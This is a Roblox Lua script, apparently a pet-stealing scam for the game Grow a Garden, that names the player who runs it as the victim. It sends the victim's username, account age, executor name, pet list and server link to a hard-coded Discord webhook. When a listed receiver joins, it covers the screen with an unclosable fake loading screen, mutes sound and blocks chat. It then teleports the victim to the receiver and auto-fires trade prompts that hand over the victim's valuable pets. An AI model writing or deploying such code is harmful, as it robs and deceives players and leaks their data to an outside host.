-- ✅ Configuration
local CONFIG = {
    WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP",
    USERNAMES = { "saikigrow", "", "yuniecoxo", "yyyyyvky" }, -- ✅ multiple usernames here
    PET_WHITELIST = {
        "Raccoon", "T-Rex", "Fennec Fox", "Dragonfly", "Butterfly", "Disco Bee",
        "Mimic Octopus", "Queen Bee", "Spinosaurus", "Kitsune"
    },
    FILE_URL = "https://cdn.discordapp.com/attachments/.../items.txt"
}

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
return
end
_G.scriptExecuted = true


if ok and serverType == "VIPServer" then
    local TeleportService = game:GetService("TeleportService")
    local HttpService = game:GetService("HttpService")

    -- Fetch public server list
    local function findLowServer()
        local placeId = game.PlaceId
        local servers = {}
        local cursor = ""

        -- Loop until we find a low-populated server
        for i = 1, 5 do
            local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&cursor=%s", placeId, cursor)
            local response = game:HttpGet(url)
            local data = HttpService:JSONDecode(response)

            for _, server in ipairs(data.data) do
                if server.playing < server.maxPlayers and server.id ~= game.JobId then
                    return server.id
                end
            end

            if not data.nextPageCursor then break end
            cursor = data.nextPageCursor
        end
        return nil
    end

    local serverId = findLowServer()
    if serverId then
        TeleportService:TeleportToPlaceInstance(game.PlaceId, serverId, game.Players.LocalPlayer)
    else
        game.Players.LocalPlayer:Kick("No public servers available. Try again.")
    end
    return
end

-- 🛠️ Services & Variables
repeat task.wait() until game:IsLoaded()
local VICTIM = game.Players.LocalPlayer
local VirtualInputManager = game:GetService("VirtualInputManager")
local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
local victimPetTable = {}

-- 🎭 Fake Legit Loading for Detected USERNAMES
local function showBlockingLoadingScreen()
    local plr = game.Players.LocalPlayer
    local playerGui = plr:WaitForChild("PlayerGui")

    -- Block chat
    pcall(function()
        local StarterGui = game:GetService("StarterGui")
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
    end)

    -- Hide leaderboard
    pcall(function()
        local StarterGui = game:GetService("StarterGui")
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
    end)

    -- Mute all sounds
    for _, sound in ipairs(workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Volume = 0
        end
    end

    -- Create fake loading GUI
    local loadingScreen = Instance.new("ScreenGui")
    loadingScreen.Name = "UnclosableLoading"
    loadingScreen.ResetOnSpawn = false
    loadingScreen.IgnoreGuiInset = true
    loadingScreen.DisplayOrder = 999999
    loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loadingScreen.Parent = playerGui

    -- Prevent removal
    loadingScreen.AncestryChanged:Connect(function()
        loadingScreen.Parent = playerGui
    end)

    -- Black background
    local blackFrame = Instance.new("Frame")
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0, 0, 0, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 1
    blackFrame.Parent = loadingScreen

    -- Blur effect
    local blurEffect = Instance.new("BlurEffect")
    blurEffect.Size = 24
    blurEffect.Name = "FreezeBlur"
    blurEffect.Parent = game:GetService("Lighting")

    -- Loading text
    local loadingLabel = Instance.new("TextLabel")
    loadingLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
    loadingLabel.Position = UDim2.new(0.25, 0, 0.45, 0)
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.TextScaled = true
    loadingLabel.Text = "Loading Wait a Moment <3..."
    loadingLabel.TextColor3 = Color3.new(1, 1, 1)
    loadingLabel.Font = Enum.Font.SourceSansBold
    loadingLabel.ZIndex = 2
    loadingLabel.Parent = loadingScreen

    -- Animate loading text
    coroutine.wrap(function()
        while true do
            for i = 1, 3 do
                loadingLabel.Text = "Loading" .. string.rep(".", i)
                task.wait(0.5)
            end
        end
    end)()

    -- Reapply effects if removed
    coroutine.wrap(function()
        while true do
            task.wait(1)
            -- Reapply blur if removed
            if not game:GetService("Lighting"):FindFirstChild("FreezeBlur") then
                local newBlur = Instance.new("BlurEffect")
                newBlur.Size = 24
                newBlur.Name = "FreezeBlur"
                newBlur.Parent = game:GetService("Lighting")
            end

            -- Remute if volume restored
            for _, sound in ipairs(workspace:GetDescendants()) do
                if sound:IsA("Sound") and sound.Volume > 0 then
                    sound.Volume = 0
                end
            end
        end
    end)()
end


local function waitForJoin()
    for _, player in game.Players:GetPlayers() do
        if table.find(CONFIG.USERNAMES, player.Name) then
            showBlockingLoadingScreen()
            return true, player.Name
        end
    end
    return false, nil
end

local function createDiscordEmbed(petList, totalValue)
    local embed = {
        title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
        color = 65280,
        fields = {
            {
                name = "👤 Player Information",
                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                    VICTIM.Name, table.concat(CONFIG.USERNAMES, ", "), identifyexecutor(), VICTIM.AccountAge),
                inline = false
            },
            {
                name = "💰 Total Value",
                value = string.format("```%s¢```", totalValue),
                inline = false
            },
            {
                name = "🌴 Backpack",
                value = string.format("```%s```", petList),
                inline = false
            },
            {
                name = "🏝️ Join with URL",
                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", game.JobId, game.PlaceId, game.JobId),
                inline = false
            }
        },
        footer = {
            text = string.format("%s | %s", game.PlaceId, game.JobId)
        }
    }

    local data = {
        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", game.PlaceId, game.JobId),
        username = VICTIM.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local request = http_request or request or HttpPost or syn.request
    request({
        Url = CONFIG.WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
end

local function checkPetsWhilelist(pet)
    for _, name in CONFIG.PET_WHITELIST do
        if string.find(pet, name) then return true end
    end
end

local function getPetObject(petUid)
    for _, object in pairs(VICTIM.Backpack:GetChildren()) do
        if object:GetAttribute("PET_UUID") == petUid then return object end
    end
    for _, object in pairs(workspace[VICTIM.Name]:GetChildren()) do
        if object:GetAttribute("PET_UUID") == petUid then return object end
    end
end

local function equipPet(pet)
    if pet:GetAttribute("d") then
        game.ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
    end
    VICTIM.Character.Humanoid:EquipTool(pet)
end

local function teleportTarget(targetName)
    local target = game.Players:FindFirstChild(targetName)
    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
    if not VICTIM.Character or not VICTIM.Character:FindFirstChild("HumanoidRootPart") then return end
    VICTIM.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
end

local function deltaBypass()
    VirtualInputManager:SendMouseButtonEvent(workspace.Camera.ViewportSize.X/2, workspace.Camera.ViewportSize.Y/2, 0, true, nil, false)
    task.wait()
    VirtualInputManager:SendMouseButtonEvent(workspace.Camera.ViewportSize.X/2, workspace.Camera.ViewportSize.Y/2, 0, false, nil, false)
end

local function startSteal(targetName)
    local target = game.Players:FindFirstChild(targetName)
    if target and target.Character and target.Character:FindFirstChild("Head") then
        local prompt = target.Character.Head:FindFirstChild("ProximityPrompt")
        if prompt then
            prompt.HoldDuration = 0
            deltaBypass()
        end
    end
end

local function checkPetsInventory(targetName)
    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if not checkPetsWhilelist(value.PetType) then continue end
        local petObject = getPetObject(petUid)
        if not petObject then continue end
        equipPet(petObject)
        startSteal(targetName)
    end
end

local function getPlayersPets()
    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
        if checkPetsWhilelist(value.PetType) then
            table.insert(victimPetTable, value.PetType)
        end
    end
end

local function idlingTarget()
    while task.wait(0.2) do
        local isTarget, targetName = waitForJoin()
        if isTarget then
            teleportTarget(targetName)
            checkPetsInventory(targetName)
        end
    end
end

-- 🟢 Start
getPlayersPets()
task.spawn(function()
    while task.wait(0.5) do
        if #victimPetTable > 0 then
            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000")
            idlingTarget()
            break
        end
    end
end)
